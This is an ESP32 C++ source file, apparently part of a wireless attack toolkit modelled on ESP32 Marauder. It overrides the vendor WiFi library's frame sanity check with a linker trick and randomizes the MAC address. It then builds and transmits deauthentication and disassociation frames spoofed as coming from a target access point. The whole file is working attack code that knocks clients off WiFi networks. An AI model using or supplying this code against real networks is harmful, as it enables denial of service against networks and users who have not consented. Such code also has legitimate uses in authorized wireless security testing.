// WSL Bypasser - Bypass ESP32 WiFi frame validation for raw TX
// Based on ESP32 Marauder's approach using -zmuldefs linker flag
// 
// The ESP32 WiFi library checks ieee80211_raw_frame_sanity_check() before
// transmitting raw frames. By defining our own version and using -zmuldefs,
// our function takes precedence over the library version.

#include "wsl_bypasser.h"
#include <esp_wifi.h>
#include <esp_system.h>
#include <esp_random.h>

extern "C" {

// Override the sanity check function
// With -zmuldefs linker flag, this definition takes precedence over libnet80211.a
// This allows deauth (0xC0), disassoc (0xA0), and auth frames to be transmitted
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    // Always return 0 (success) - allow all frame types
    return 0;
}

}

namespace WSLBypasser {

bool initialized = false;

void init() {
    if (initialized) return;
    
    // Log that bypass is active
    Serial.println("[WSL] Frame validation bypass active (-zmuldefs)");
    initialized = true;
}

void randomizeMAC() {
    uint8_t mac[6];
    
    // Generate random MAC using hardware RNG
    esp_fill_random(mac, 6);
    
    // Set locally administered bit (bit 1 of first byte) and clear multicast bit (bit 0)
    // This marks it as a valid unicast locally-administered address
    mac[0] = (mac[0] & 0xFC) | 0x02;
    
    // Apply the new MAC address
    esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, mac);
    
    if (result == ESP_OK) {
        Serial.printf("[WSL] MAC randomized: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        Serial.printf("[WSL] MAC randomization failed: %d\n", result);
    }
}

bool sendDeauthFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* staMac, uint8_t reason) {
    // Ensure we're on the right channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Deauth frame (26 bytes)
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth (subtype 0x0C)
        0x00, 0x00,  // Duration
        // Addr1 (DA - destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Addr2 (SA - source, spoofed as BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Addr3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Sequence control
        0x00, 0x00,
        // Reason code (2 bytes, little endian)
        0x07, 0x00   // Class 3 frame received from non-associated station
    };
    
    // Set addresses
    memcpy(deauthPacket + 4, staMac, 6);   // Destination
    memcpy(deauthPacket + 10, bssid, 6);   // Source (AP)
    memcpy(deauthPacket + 16, bssid, 6);   // BSSID
    deauthPacket[24] = reason;             // Reason code
    
    // Try to send
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    return (result == ESP_OK);
}

bool sendDisassocFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* staMac, uint8_t reason) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Disassoc frame (26 bytes) - same structure as deauth
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (subtype 0x0A)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code: Disassociated because station leaving
    };
    
    memcpy(disassocPacket + 4, staMac, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
    return (result == ESP_OK);
}

}
